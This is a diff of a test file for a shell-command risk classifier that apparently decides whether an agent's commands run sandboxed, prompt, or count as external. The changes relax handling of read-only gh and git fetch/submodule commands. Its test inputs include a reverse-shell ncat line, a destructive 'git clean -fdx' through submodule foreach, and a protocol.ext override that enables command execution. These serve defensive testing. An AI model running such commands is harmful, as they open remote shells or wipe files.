@@ -26,18 +26,52 @@ describe('analyzeShellCommand', () => {
     assert.equal(r.verdict, 'external')
   })
 
-  it('flags gh CLI as ambiguous (auto-runs inside seatbelt, escalates on block)', () => {
-    const r = analyzeShellCommand('gh pr view --json state', root)
+  it('flags a writing gh CLI subcommand as ambiguous (auto-runs inside seatbelt, escalates on block)', () => {
+    const r = analyzeShellCommand('gh pr create --fill', root)
     assert.equal(r.verdict, 'ambiguous')
     assert.ok(r.reasons.some((x) => x.includes('GitHub CLI')))
   })
 
-  it('flags gh CLI after a pipe/separator', () => {
-    for (const cmd of ['cat body.md | gh pr create -F -', 'echo hi && gh pr view']) {
+  it('treats read-only gh subcommands as sandbox-safe, not ambiguous (#500)', () => {
+    // `gh (pr|issue|run) (list|view|status)` only read from GitHub, so they carry no
+    // external signal and go through the normal sandbox path (classifier/seatbelt)
+    // rather than prompting outright where there's no OS sandbox.
+    for (const cmd of [
+      'gh pr list',
+      'gh pr view --json state',
+      'gh pr status',
+      'gh issue list --limit 5',
+      'gh issue view 42',
+      'gh run list',
+      'gh run view 123 --log',
+    ]) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'sandbox', `expected sandbox for: ${cmd}`)
+      assert.ok(
+        !r.reasons.some((x) => x.includes('GitHub CLI')),
+        `unexpected gh reason for: ${cmd}`,
+      )
+    }
+  })
+
+  it('keeps writing / non-read-only gh subcommands ambiguous', () => {
+    // Only the read verbs are carved out; writes and `gh api` (which can POST/DELETE)
+    // still route through the ambiguous matcher.
+    for (const cmd of ['gh pr create', 'gh pr merge 3', 'gh issue close 7', 'gh api repos/x/y']) {
       const r = analyzeShellCommand(cmd, root)
       assert.equal(r.verdict, 'ambiguous', `expected ambiguous for: ${cmd}`)
       assert.ok(r.reasons.some((x) => x.includes('GitHub CLI')))
     }
+  })
+
+  it('flags a writing gh CLI after a pipe/separator, still carving out read-only ones', () => {
+    for (const cmd of ['cat body.md | gh pr create -F -', 'echo hi && gh pr merge']) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'ambiguous', `expected ambiguous for: ${cmd}`)
+      assert.ok(r.reasons.some((x) => x.includes('GitHub CLI')))
+    }
+    // A read-only gh after a separator carries no external signal.
+    assert.equal(analyzeShellCommand('echo hi && gh pr view', root).verdict, 'sandbox')
   })
 
   it('does not treat gh inside a path/argument as the GitHub CLI', () => {
@@ -201,6 +235,48 @@ describe('analyzeShellCommand', () => {
     assert.equal(analyzeShellCommand('git submodule update --init', root).verdict, 'external')
   })
 
+  it('treats git fetch as a network read (ambiguous), not hard-external (#500)', () => {
+    // `git fetch` only reads from the remote — auto-run inside an OS sandbox (blocked
+    // network escalates to a retry), prompt without one. `pull`/`clone`/`push` stay
+    // hard-external because they merge, check out, run hooks, or write the remote.
+    for (const cmd of ['git fetch', 'git fetch origin main', 'git fetch --all --prune']) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'ambiguous', `expected ambiguous for: ${cmd}`)
+      assert.ok(
+        r.reasons.some((x) => /git network read/.test(x)),
+        `missing fetch reason for: ${cmd}`,
+      )
+    }
+    assert.equal(analyzeShellCommand('git pull origin main', root).verdict, 'external')
+    assert.equal(analyzeShellCommand('git clone https://x/y', root).verdict, 'external')
+  })
+
+  it('carves out read-only git submodule reads but keeps update/add/foreach external (#500)', () => {
+    // Local-only reads (recorded SHAs + working-tree state, like `git status`).
+    for (const cmd of ['git submodule', 'git submodule status', 'git submodule summary']) {
+      assert.equal(
+        analyzeShellCommand(cmd, root).verdict,
+        'sandbox',
+        `expected sandbox for: ${cmd}`,
+      )
+    }
+    // Network fetch + checkout/hook or arbitrary-exec forms stay a hard prompt.
+    for (const cmd of [
+      'git submodule update --init',
+      'git submodule update --init --recursive',
+      'git submodule add https://x/y vendor/y',
+      'git submodule foreach git clean -fdx',
+      'git -c protocol.ext.allow=always submodule update',
+    ]) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'external', `expected external for: ${cmd}`)
+      assert.ok(
+        r.reasons.some((x) => /submodule/.test(x)),
+        `missing submodule reason for: ${cmd}`,
+      )
+    }
+  })
+
   it('flags ncat', () => {
     assert.equal(analyzeShellCommand('ncat -e /bin/sh 10.0.0.1 4444', root).verdict, 'external')
   })
@@ -323,7 +399,8 @@ describe('analyzeShellCommand', () => {
       ['ls -la node_modules', 'sandbox'],
       ['git status', 'sandbox'],
       ['grep -n foo src/main/services/gh-pr-service.ts | head -20', 'sandbox'],
-      ['gh pr view --json state', 'ambiguous'],
+      ['gh pr view --json state', 'sandbox'],
+      ['gh pr create', 'ambiguous'],
       ['npx tsx scripts/build-thing.mts', 'ambiguous'],
       ['curl https://example.com', 'external'],
       ['npm install lodash', 'external'],
